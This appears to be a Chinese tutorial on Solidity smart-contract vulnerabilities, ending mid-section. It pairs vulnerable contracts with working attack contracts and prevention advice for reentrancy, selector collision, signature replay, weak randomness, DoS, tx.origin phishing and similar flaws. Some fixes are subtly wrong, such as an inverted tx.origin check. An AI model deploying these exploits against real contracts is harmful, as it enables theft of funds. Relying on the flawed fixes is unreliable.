重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为0的状态变量_status。被nonReentrant重入锁修饰的函数，在第一次调用时会检查_status是否为0，紧接着将_status的值改为1，调用结束后才会再改为0。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。 123456789101112uint256 private _status; // 重入锁// 重入锁modifier nonReentrant() &#123; // 在第一次调用 nonReentrant 时，_status 将是 0 require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;); // 在此之后对 nonReentrant 的任何调用都将失败 _status = 1; _; // 调用结束，将 _status 恢复为0 _status = 0;&#125; 只需要用nonReentrant重入锁修饰withdraw()函数，就可以预防重入攻击了。 2. 选择器碰撞 📌以太坊智能合约中，函数选择器是函数签名 &quot;&lt;function name&gt;(&lt;function input types&gt;)&quot; 的哈希值的前4个字节（8位十六进制）。当用户调用合约的函数时，calldata的前4字节就是目标函数的选择器，决定了调用哪个函数。 2.1 复现下面我们来看一下有漏洞的合约例子。SelectorClash合约有1个状态变量 solved，初始化为false，攻击者需要将它改为true。合约主要有2个函数，函数名沿用自 Poly Network 漏洞合约。 putCurEpochConPubKeyBytes() ：攻击者调用这个函数后，就可以将solved改为true，完成攻击。但是这个函数检查msg.sender == address(this)，因此调用者必须为合约本身，我们需要看下其他函数。 executeCrossChainTx() ：通过它可以调用合约内的函数，但是函数参数的类型和目标函数不太一样：目标函数的参数为(bytes)，而这里调用的函数参数为(bytes,bytes,uint64)。 1234567891011121314contract SelectorClash &#123; bool public solved; // 攻击是否成功 // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。 function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123; require(msg.sender == address(this), &quot;Not Owner&quot;); solved = true; &#125; // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。 function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123; (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num))); &#125;&#125; 攻击方法 利用executeCrossChainTx()函数调用合约中的putCurEpochConPubKeyBytes()，目标函数的选择器为：0x41973cd9。观察到executeCrossChainTx()中是利用_method参数和&quot;(bytes,bytes,uint64)&quot;作为函数签名计算的选择器。因此，我们只需要选择恰当的_method，让这里算出的选择器等于0x41973cd9，通过选择器碰撞调用目标函数。 Poly Network黑客事件中，黑客碰撞出的_method为 f1121318093，即f1121318093(bytes,bytes,uint64)的哈希前4位也是0x41973cd9，可以成功的调用函数。接下来我们要做的就是将f1121318093转换为bytes类型：0x6631313231333138303933，然后作为参数输入到executeCrossChainTx()中。executeCrossChainTx()函数另3个参数不重要，填 0x, 0x, 0 就可以。 将f1121318093转为bytes类型的 在线编译器 这两个网站来查同一个选择器对应的不同函数： https://www.4byte.directory/ https://sig.eth.samczsun.com/ Remix复现 部署SelectorClash合约，并调用putCurEpochConPubKeyBytes会报错 将 f1121318093转为bytes类型之后，调用 executeCrossChainTx函数 solved的值被成功修改为true 3. 访问控制某些对权限有要求的方法的修饰符逻辑错误造成合约中的某些私有函数可以被非法调用 常出现的地方 function 的修饰器 modifier上； 访问控制权限 private public internal external 调用方法 call delegatecall 3.1 复现漏洞示例一 1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.24;contract AccessGame&#123; uint totalSupply=0; address public owner; mapping (address =&gt; uint256) public balances; event SendBouns(address _who, uint bouns); modifier onlyOwner &#123; if (msg.sender != owner) revert(); _; &#125; constructor() public &#123; initOwner(msg.sender); //initOwner()初始化管理员权限 &#125; function initOwner(address _owner) public&#123; owner=_owner; &#125; function SendBonus(address lucky, uint bouns) public onlyOwner returns (uint)&#123; require(balances[lucky]&lt;1000); require(bouns&lt;200); balances[lucky]+=bouns; totalSupply+=bouns; emit SendBouns(lucky, bouns); return balances[lucky]; &#125;&#125; onlyOwner 修饰器要求调用者必须是 owner，而owner在初始化的时候就已经声明了，但是 function initOwner(address _owner) public，的访问权限为 public，任何人都可以调用，只要将owner设置为hacker就可以成功调用SendBonus函数了。 漏洞示例二 call的滥用 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Target &#123; bool public issloved; function slove() external &#123; require(msg.sender == address(this)); issloved = true; &#125; function call(bytes memory data) external &#123; address(this).call(data); &#125;&#125;contract Hacker &#123; address target; constructor(address _target) &#123; target = _target; &#125; function attack() external &#123; target.call(abi.encodeWithSelector(Target.call.selector, abi.encodeWithSignature(&quot;slove()&quot;))); &#125;&#125; 低级调用call会改变msg.sender的值。 4. 整数溢出以太坊虚拟机 (EVM) 为整数指定固定大小的数据类型。这意味着一个整数变量，只能表示一定范围的数字。例如uint8 只能存储 [0,255] 范围内的数字。尝试将 256 存储到 uint8 将导致 0。如果不小心，用户输入未被检查，并且执行的计算结果超出了存储它们的数据类型的范围，那么 Solidity 中的变量可能会被利用。整数溢出漏洞有上溢和下溢两种情形。solidity 0.8.0 版本之之前。 上溢 整数上溢是指数字的增量超过其能存储的最大值。如对于 uint256 类型的变量，Solidity 可以处理多达 256 个比特位的数值 (最大值是 2256 - 1)，所以如果在最大数上增加 1 会导致 0。如下所示： 12345 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF+ 0x000000000000000000000000000000000001------------------------------------------= 0x000000000000000000000000000000000000 下溢 同样，在相反的情况下，当数字是无符号的时，递减将会下溢该数字，从而得到可能的最大值。如下所示： 12345 0x000000000000000000000000000000000000- 0x000000000000000000000000000000000001------------------------------------------= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF 4.1 复现示例一 1234567891011121314151617181920212223pragma solidity ^0.4.18;contract TimeLock &#123; mapping(address =&gt; uint) public balances; mapping(address =&gt; uint) public lockTime; function deposit() public payable &#123; balances[msg.sender] += msg.value; lockTime[msg.sender] = now + 1 weeks; &#125; function increaseLockTime(uint _secondsToIncrease) public &#123; lockTime[msg.sender] += _secondsToIncrease; &#125; function withdraw() public &#123; require(balances[msg.sender] &gt; 0); require(now &gt; lockTime[msg.sender]); uint transferValue = balances[msg.sender]; balances[msg.sender] = 0; msg.sender.transfer(transferValue); &#125;&#125; 其中的increaseLockTime函数中，由于可以自己输入一个自由的时间戳增量，所以会带来整数溢出的危险。试想一下，如果输入的_secondsToIncrease和原有的lockTime[msg.sender]相加，由于溢出，最后使得lockTime[msg.sender]的值成为一个很小的值，这样在withdraw函数中，就可以顺利通过。 攻击合约 12345678contract Hacker &#123; function attack() external view returns (uint256 result) &#123; uint zero = 0; uint hacker_time = zero - 1; result = hacker_time - now; &#125;&#125; 示例二 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; unchecked&#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; &#125; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125;&#125; 📌分析： 由于solidity 0.8.0 版本之后会自动检查整型溢出错误，溢出时会报错。如果我们要重现这种漏洞，需要使用 unchecked 关键字，在代码块中临时关掉溢出检查。 漏洞所在： require(balances[msg.sender] - _value &gt;= 0);不管转账的金额是多少，该条件永远都会通过，当balances[msg.sender] &gt; _value时，此时msg.sender的余额发生下溢，余额将多到离谱。 4.2 预防我们建议使用 OpenZeppelin 的 SafeMath 库来解决整数溢出问题。OppenZepplin 在构建和审计安全库方面做得很好，特别是他们的安全数学库是一个用来避免溢出漏洞的参考或库，且已称为一个标准。 使用方法：using SafeMath for uint; 5. 签名重放 📌 数字签名一般有两种常见的重放攻击 普通重放：将本该使用一次的签名多次使用。 跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。 5.1 复现下面的SigReplay合约是一个ERC20代币合约，它的铸造函数有签名重放漏洞。它使用链下签名让白名单地址 to 铸造相应数量 amount 的代币。合约中保存了 signer 地址，来验证签名是否有效。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;// 权限管理错误例子contract SigReplay is ERC20 &#123; address public signer; // 构造函数：初始化代币名称和代号 constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123; signer = msg.sender; &#125; /** * 有签名重放漏洞的铸造函数 * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 * amount: 1000 * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b */ function badMint(address to, uint amount, bytes memory signature) public &#123; bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount)); require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;); _mint(to, amount); &#125; /** * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 * amount: 1000 * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be */ function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123; return keccak256(abi.encodePacked(to, amount)); &#125; /** * @dev 获得以太坊签名消息 * `hash`：消息哈希 * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`] * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191` * 添加&quot;\\x19Ethereum Signed Message:\\n32&quot;字段，防止签名的是可执行交易。 */ function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123; // 32 is the length in bytes of hash, // enforced by the type signature above return keccak256(abi.encodePacked(&quot;\\x19Ethereum Signed Message:\\n32&quot;, hash)); &#125; // ECDSA验证 function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123; return ECDSA.recover(_msgHash, _signature) == signer; &#125; 注意 铸造函数 badMint() 没有对 signature 查重，导致同样的签名可以多次使用，无限铸造代币 12345function badMint(address to, uint amount, bytes memory signature) public &#123; bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount))); require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;); _mint(to, amount);&#125; 简单来说就是，学校给你一张免费餐券，按照常理来说，一张午餐券只能使用一次，但是食堂阿姨她不收走你的免费午饭券，以致于下次你继续拿着这张免费餐券来吃饭，阿姨又不收走，然后你就一直靠着这张餐券白吃白喝。 5.2 预防签名重放攻击主要有两种预防办法 方法一：将使用过的签名记录下来，比如记录下已经铸造代币的地址 mintedAddress，防止签名反复使用 12345678910111213mapping(address =&gt; bool) public mintedAddress; // 记录已经mint的地址function goodMint(address to, uint amount, bytes memory signature) public &#123; bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount)); require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;); // 检查该地址是否mint过 require(!mintedAddress[to], &quot;Already minted&quot;); // 记录mint过的地址 mintedAddress[to] = true; _mint(to, amount);&#125;```solidity 方法二：将 nonce （数值随每次交易递增）和 chainid （链ID）包含在签名消息中，这样可以防止普通重放和跨链重放攻击 12345678uint nonce;function nonceMint(address to, uint amount, bytes memory signature) public &#123; bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid))); require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;); _mint(to, amount); nonce++;&#125; 6. 坏随机数很多以太坊上的应用都需要用到随机数，例如NFT随机抽取tokenId、抽盲盒、gamefi战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（public）且确定性（deterministic）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如random()。很多项目方不得不使用链上的伪随机数生成方法，例如 blockhash() 和 keccak256() 方法。 坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有NFT而非随机抽取 6.1 复现案例 123456789101112131415contract BadRandomness is ERC721 &#123; uint256 totalSupply; // 构造函数，初始化NFT合集的名称、代号 constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125; // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint function luckyMint(uint256 luckyNumber) external &#123; uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;); _mint(msg.sender, totalSupply); // mint totalSupply++; &#125;&#125; 伪随机数使用 blockhash 和 block.timestamp 声称 攻击合约 12345678910contract Attack &#123; function attackMint(BadRandomness nftAddr) external &#123; // 提前计算随机数 uint256 luckyNumber = uint256( keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)) ) % 100; // 利用 luckyNumber 攻击 nftAddr.luckyMint(luckyNumber); &#125;&#125; 分析： 攻击函数 attackMint()中的参数为 BadRandomness合约地址。在其中，我们计算了随机数 luckyNumber，然后将它作为参数输入到 luckyMint() 函数完成攻击。由于attackMint()和luckyMint()将在同一个区块中调用，blockhash和block.timestamp是相同的，利用他们生成的随机数也相同。这个漏洞在 此靶场中有考察过。 6.2 预防我们通常使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。这类随机数从链下生成，然后上传到链上，从而保证随机数不可预测。更多介绍可以阅读 WTF Solidity极简教程 第39讲：伪随机数。 7. 绕过合约长度检查很多 freemint 的项目为了限制科学家（程序员）会用到 isContract() 方法，希望将调用者 msg.sender 限制为外部账户（EOA），而非合约。这个函数利用 extcodesize 获取该地址所存储的 bytecode 长度（runtime），若大于0，则判断为合约，否则就是EOA（用户）。 7.1 复现12345678910// 利用 extcodesize 检查是否为合约function isContract(address account) public view returns (bool) &#123; // extcodesize &gt; 0 的地址一定是合约地址 // 但是合约在构造函数时候 extcodesize 为0 uint size; assembly &#123; size := extcodesize(account) &#125; return size &gt; 0;&#125; 这里有一个漏洞，就是在合约在被创建的时候，runtime bytecode 还没有被存储到地址上，因此 bytecode 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 constructor 中的话，就可以绕过 isContract() 检查。 怎么理解呢，extcodesize统计的是部署到区块链上的合约代码大小，而合约未初始化完成的时候，就不会上链，此时统计该合约的代码大小也是为0，这样就可以绕过合约检查了。 示例 ContractCheck合约是一个 freemint ERC20 合约，铸造函数 mint() 中使用了 isContract() 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 mint() 可以铸造 100 枚代币。 12345678910111213141516171819202122// 用extcodesize检查是否为合约地址contract ContractCheck is ERC20 &#123; // 构造函数：初始化代币名称和代号 constructor() ERC20(&quot;&quot;, &quot;&quot;) &#123;&#125; // 利用 extcodesize 检查是否为合约 function isContract(address account) public view returns (bool) &#123; // extcodesize &gt; 0 的地址一定是合约地址 // 但是合约在构造函数时候 extcodesize 为0 uint size; assembly &#123; size := extcodesize(account) &#125; return size &gt; 0; &#125; // mint函数，只有非合约地址能调用（有漏洞） function mint() public &#123; require(!isContract(msg.sender), &quot;Contract not allowed!&quot;); _mint(msg.sender, 100); &#125;&#125; 写一个攻击合约，在 constructor 中多次调用 ContractCheck 合约中的 mint() 函数，批量铸造 1000 枚代币。 1234567891011121314151617181920// 利用构造函数的特点攻击contract NotContract &#123; bool public isContract; address public contractCheck; // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。 constructor(address addr) &#123; contractCheck = addr; isContract = ContractCheck(addr).isContract(address(this)); // This will work for(uint i; i &lt; 10; i++)&#123; ContractCheck(addr).mint(); &#125; &#125; // 合约创建好以后，extcodesize &gt; 0，isContract() 可以检测 function mint() external &#123; ContractCheck(contractCheck).mint(); &#125;&#125; 调用NotContract 合约的 mint() 函数，由于此时合约已经部署完成，调用 mint() 函数将失败。 7.2 预防可以使用 (tx.origin == msg.sender) 来检测调用者是否为合约。如果调用者为 EOA，那么tx.origin和msg.sender相等；如果它们俩不相等，调用者为合约。 在原来的合约上添加此函数，且mint函数中断言也需要修改。 123456789function realContract(address account) public view returns (bool) &#123; return (tx.origin == account);&#125;function mint() public &#123; require(!realContract(msg.sender), &quot;Contract not allowed!&quot;); _mint(msg.sender, 100);&#125; 分析，tx.origin肯定是一个EOA账户，如果msg.sender不是一个EOA账户的话，将无法通过该断言。 8. 拒绝服务攻击DoS 是 Denial of service 的简称，即拒绝服务，任何对服务的干涉，使得其可用性降低或者失去可用性均称为拒绝服务。在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。 智能合约拒绝服务攻击：可以导致智能合约无法正常使用的代码逻辑错误，兼容性错误或调用深度过大（区块链虚拟机的特性）的安全问题。智能合约中的拒绝服务攻击手法就相对比较简单，包括但不限于以下三种： 1、基于代码逻辑的拒绝服务攻击：这种类型的拒绝服务攻击一般情况下是因为合约代码逻辑的不严谨造成的，最典型的就是当合约中存在对传入的映射或数组循环遍历的逻辑且没有限制传入的映射或数组的长度时攻击者可以通过传入超长的映射或者数组进行循环遍历而大量消耗 Gas 从而该笔交易的 Gas 溢出，最后使得智能合约暂时或永久不可操作。 2、基于外部调用的拒绝服务攻击：这种拒绝服务攻击是建立在合约中对外部调用处理不当导致的。例如智能合约中存在基于外部函数执行的结来改变合约状态且没有对交易一直失败的情况做出处理，攻击者会利用这个特点故意使交易失败，智能合约则会一直重复这笔失败的交易从而造成智能合约逻辑卡在这里不能继续执行，最后使得智能合约暂时或永久不可操作。 3、基于运营管理的拒绝服务攻击：这种拒绝服务攻击就是建立在后期运营情况下，例如在智能合约中通常会存在以 Owner 账户作为管理员角色，该角色通常会持有很高的权限，例如开启或暂停转账功能，当 Owner 角色操作失误或私钥丢失可能会受到非主观意义上的拒绝服务攻击。 8.1 复现基于外部调用的拒绝服务攻击 示例一 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.13;contract KingOfEther &#123; address public king; uint public balance; function claimThrone() external payable &#123; require(msg.value &gt; balance, &quot;Need to pay more to become the king&quot;); (bool sent, ) = king.call&#123;value: balance&#125;(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); balance = msg.value; king = msg.sender; &#125;&#125; Hacker 12345678910111213141516171819// SPDX-License-Identifier: MITpragma solidity ^0.8.13;contract Attack &#123; KingOfEther kingOfEther; constructor(KingOfEther _kingOfEther) &#123; kingOfEther = KingOfEther(_kingOfEther); &#125; function attack() public payable &#123; kingOfEther.claimThrone&#123;value: msg.value&#125;(); &#125;&#125; 分析 （这里引用了慢雾的分析，感觉分析得很有意思） 首先我们先来分析攻击流程： Alice 部署 KingOfEther 合约。 Alice 调用 KingOfEther.claimThrone() 发送 1 个以太到 KingOfEther 合约中成为「以太之王」。 高富帅 Bob 调用 KingOfEther.claimThrone() 发送 2 个以太到 KingOfEther 合约中成为新王。 Alice 收到 1 个以太币的退款。 Eve 使用 KingOfEther 的地址部署攻击合约 Attack。 Eve 调用 Attack.attack() 向 KingOfEther 合约中发送 3 个以太。 Attack 合约成为新王。 高富帅 Bob 觉得不服，再次调用 KingOfEther.claimThrone() 向 KingOfEther 合约中发送了 20 个以太展现自己的「钞能力」。 Bob 发现自己的交易一直被 revert，无法成为新王。至此，Eve 的攻击使 KingOfEther 合约永久失效，Attack 合约成为了永远的「以太之王」。 高富帅 Bob 觉得不可思议，为啥自己这么有钱还不能称王呢？我们来看看到底是为什么。 当 Bob 调用 KingOfEther.claimThrone() 发送 20 个以太到 KingOfEther 合约时会触发 KingOfEther.claimThrone() 的退款逻辑，将之前 Eve 通过 Attack.attack() 向 KingOfEther 合约中发送的 3 个以太原路退回到 Attack 合约。我们再来看 Attack 合约，该合约中没有实现 payable 的 fallback() 所以不能接收以太币，这将导致 KingOfEther.claimThrone() 的退款逻辑一直失败，退款返回值 sent 将一直为 false 无法通过 require(sent, “Failed to send Ether”) 检查一直被 revert。因为只要触发退款就会被 revert 导致 KingOfEther 合约中继 Attack 合约后无人能成为新王，Eve 成功完成了拒绝服务攻击。 示例二 1234567891011121314151617181920212223242526272829303132333435363738// SPDX-License-Identifier: MITpragma solidity ^0.8.4;// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。contract DoSGame &#123; bool public refundFinished; mapping(address =&gt; uint256) public balanceOf; address[] public players; // 所有玩家存ETH到合约里 function deposit() external payable &#123; require(!refundFinished, &quot;Game Over&quot;); require(msg.value &gt; 0, &quot;Please donate ETH&quot;); // 记录存款 balanceOf[msg.sender] = msg.value; // 记录玩家地址 players.push(msg.sender); &#125; // 游戏结束，退款开始，所有玩家将依次收到退款 function refund() external &#123; require(!refundFinished, &quot;Game Over&quot;); uint256 pLength = players.length; // 通过循环给所有玩家退款 for(uint256 i; i &lt; pLength; i++)&#123; address player = players[i]; uint256 refundETH = balanceOf[player]; (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;); require(success, &quot;Refund Fail!&quot;); balanceOf[player] = 0; &#125; refundFinished = true; &#125; function balance() external view returns(uint256)&#123; return address(this).balance; &#125;&#125; 漏洞在于，refund() 函数中利用循环退款的时候，是使用的 call 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。如何如何理解呢，call转账，便会触发目标地址的回退函数，如果在回退函数中加入revert();语句，此时success的值永远都是false，循环将被迫终止，从而使得Hacker之后的用户永远无法取款。 Hacker 123456789101112contract Hacker &#123; // 退款时进行DoS攻击 fallback() external payable&#123; revert(&quot;DoS Attack!&quot;); &#125; // 参与DoS游戏并存款 function attack(address gameAddr) external payable &#123; DoSGame dos = DoSGame(gameAddr); dos.deposit&#123;value: msg.value&#125;(); &#125;&#125; attack() 函数中将调用 DoSGame 合约的 deposit() 存款并参与游戏；fallback() 回调函数将回退所有向该合约发送ETH的交易，对DoSGame 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。 8.2 预防方法 很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方： 外部合约的函数调用（例如 call）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 require(success, &quot;Refund Fail!&quot;); 去掉，退款在单个地址失败时仍能继续运行。 合约不会出乎意料的自毁。 合约不会进入无限循环。 require 和 assert 的参数设定正确。 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。 确保回调函数不会影响正常合约运行。 确保当合约的参与者（例如 owner）永远缺席时，合约的主要业务仍能顺利运行。 9. 貔貅这是一个会被割韭菜的漏洞 具体介绍 在这里 10. 抢先交易 链上抢跑指的是搜索者或矿工通过调高gas或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而MEV是衡量这种利润的指标。 在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些MEV机器人也会搜索mempool中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的swap交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。 详细学习 11. tx.origin钓鱼攻击 📌 这个漏洞我感觉有点牵强吧，为哈子tx.origin要无缘无故乱调用未知的函数捏，反正咱管不着，万一捏，万一ta好奇心强呢。 11.1 复现Bank transfer(): 该函数会获得两个参数_to和_amount，先检查tx.origin == owner，无误后再给_to转账_amount数量的ETH。注意：这个函数有被钓鱼攻击的风险！ 12345678910111213141516contract Bank &#123; address public owner;//记录合约的拥有者 //在创建合约时给 owner 变量赋值 constructor() payable &#123; owner = msg.sender; &#125; function transfer(address payable _to, uint _amount) public &#123; //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！ require(tx.origin == owner, &quot;Not owner&quot;); //转账ETH (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); &#125;&#125; Hacker attack()：攻击函数，该函数需要银行合约的owner地址调用，owner调用攻击合约，攻击合约再调用银行合约的transfer()函数，确认tx.origin == owner后，将银行合约内的余额全部转移到黑客地址中。 123456789101112131415161718contract Attack &#123; // 受益者地址 address payable public hacker; // Bank合约地址 Bank bank; constructor(Bank _bank) &#123; //强制将address类型的_bank转换为Bank类型 bank = Bank(_bank); //将受益者地址赋值为部署者地址 hacker = payable(msg.sender); &#125; function attack() public &#123; //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中 bank.transfer(hacker, address(bank).balance); &#125;&#125; Remix演示 先给Bank转钱，转 5ETH 切换到另一个账户（hacker账户），部署攻击合约 这里最那啥，需要切换回Bank的部署者地址，就算是 ***诱导***吧，调用attackt函数 11.2 预防 目前主要有两种办法来预防可能的tx.origin钓鱼攻击。 1 .使用msg.sender代替tx.origin msg.sender能够获取直接调用当前合约的调用发送者地址，通过对msg.sender的检验，就可以避免整个调用过程中混入外部攻击合约对当前合约的调用 123456function transfer(address payable _to, uint256 _amount) public &#123; require(msg.sender == owner, &quot;Not owner&quot;); (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;);&#125; 2. 检验tx.origin == msg.sender 如果一定要使用tx.origin，那么可以再检验tx.origin是否等于msg.sender，这样也可以避免整个调用过程中混入外部攻击合约对当前合约的调用。但是副作用是其他合约将不能调用这个函数。 123456function transfer(address payable _to, uint _amount) public &#123; require(tx.origin == owner, &quot;Not owner&quot;); require(tx.origin == msg.sender, &quot;can&#x27;t call by external contract&quot;); (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;);&#125; 好嘛，名字起的好，叫作钓鱼~ 12. 未检查的低级调用 📌以太坊的低级调用包括 call()，delegatecall()，staticcall()，和send()。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 false ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。 最容易出错的是send()：一些合约使用 send() 发送 ETH，但是 send() 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 send() 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。 12.1 复现示例 UncheckedBank 1234567891011121314151617181920212223contract UncheckedBank &#123; mapping (address =&gt; uint256) public balanceOf; // 余额mapping // 存入ether，并更新余额 function deposit() external payable &#123; balanceOf[msg.sender] += msg.value; &#125; // 提取msg.sender的全部ether function withdraw() external &#123; // 获取余额 uint256 balance = balanceOf[msg.sender]; require(balance &gt; 0, &quot;Insufficient balance&quot;); balanceOf[msg.sender] = 0; // Unchecked low-level call bool success = payable(msg.sender).send(balance); &#125; // 获取银行合约的余额 function getBalance() external view returns (uint256) &#123; return address(this).balance; &#125;&#125; Hacker 它刻画了一个倒霉的储户，取款失败但是银行余额清零：合约回调函数 receive() 中的 revert() 将回滚交易，因此它无法接收 ETH；但是提款函数 withdraw() 却能正常调用，清空余额。 12345678910111213141516171819202122232425262728contract Attack &#123; UncheckedBank public bank; // Bank合约地址 // 初始化Bank合约地址 constructor(UncheckedBank _bank) &#123; bank = _bank; &#125; // 回调函数，转账ETH时会失败 receive() external payable &#123; revert(); &#125; // 存款函数，调用时 msg.value 设为存款数量 function deposit() external payable &#123; bank.deposit&#123;value: msg.value&#125;(); &#125; // 取款函数，虽然调用成功，但实际上取款失败 function withdraw() external payable &#123; bank.withdraw(); &#125; // 获取本合约的余额 function getBalance() external view returns (uint256) &#123; return address(this).balance; &#125;&#125; 分析：因为 UncheckedBank 合约中的 withdraw函数，未对执行结果进行判断，ta只管转账，不管用户是否受到，如果用户没收到，ta照样将用户的存款清空。 12.2 预防 检查低级调用的返回值，在上面的银行合约中，我们可以改正 withdraw()。 12bool success = payable(msg.sender).send(balance);require(success, &quot;Failed Sending ETH!&quot;) 合约转账ETH时，使用 call()，并做好重入保护。 使用OpenZeppelin的Address库，它将检查返回值的低级调用封装好了。 13. 操纵区块时间 以太坊智能合约中使用block.timestamp来向合约提供当前区块的时间戳，并且这个变量通常被用于计算随机数、锁定资金等。但是区块的打包时间并不是系统设定的，而是可以由矿工在一定的幅度内进行自行调整。因此，一旦时间戳使用不当，则会引起漏洞。 核心问题：矿工操纵时间戳生成对自己有利的随机数，或者来解除合约的时间限制 13.1 复现示例一 合约通过交易发送所在区块时间戳来决定是否获奖，每个区块中只允许第一笔交易获奖，若区块时间戳的十进制表示最低位是5，交易发送者即可获奖。 1234567891011121314pragma solidity ^0.4.24;contract TimeGame1&#123; uint public lastBlockTime; function lucky() public payable&#123; require(msg.value == 100 wei); require(lastBlockTime != block.timestamp); //block.timestamp获取当前区块的时间戳 lastBlockTime = block.timestamp; if(lastBlockTime % 10 == 5)&#123; msg.sender.transfer(address(this).balance); &#125; &#125;&#125; 漏洞点：由于矿工有个0~900s的任意设置时间戳的权限，导致矿工可以非常轻易的来设置满足交易的时间戳。普通用户可以自己写一个攻击合约来调用lucky(),也是可以自由设置满足交易的时间戳。 示例二 14. 短地址攻击如果我们想调用智能合约的函数，需要在交易的payload字段中填充一段字节码。以ERC20的transfer()的函数为例，函数原型为： function transfer(address to, uint amount) public returns (bool success); 我们需要通过一段68个字节的字节码来调用该函数进行转账，比如： 